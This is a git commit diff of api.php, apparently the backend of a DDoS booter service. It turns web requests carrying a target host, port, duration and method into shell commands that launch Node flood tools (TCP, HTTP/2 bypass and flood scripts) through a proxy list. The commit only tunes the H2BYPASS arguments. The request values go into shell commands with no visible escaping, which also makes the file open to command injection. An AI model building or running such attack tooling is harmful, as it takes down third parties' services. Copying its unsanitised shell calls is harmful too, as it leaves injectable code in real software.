12182e9245c0a917e04b51f0085ef65b9ad614c9
starpezkocakni <starpezgood@gmail.com>
2025-02-10 22:19:04 +0700

    Add files via upload

--- api.php
+++ api.php
@@ -31,7 +31,7 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
             $command = "cd /var/www/html/test/ && screen -dm node tcpssh $host $port root $time";
             break;
         case 'H2BYPASS':
-            $command = "cd /var/www/html/test/ && screen -dm node bypass $host $time 10 4 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node bypass $host $time 8 2 proxy.txt";
             break;
         case 'H2FLOOD':
             $command = "cd /var/www/html/test/ && screen -dm node blast $host $time 8 2 proxy.txt";
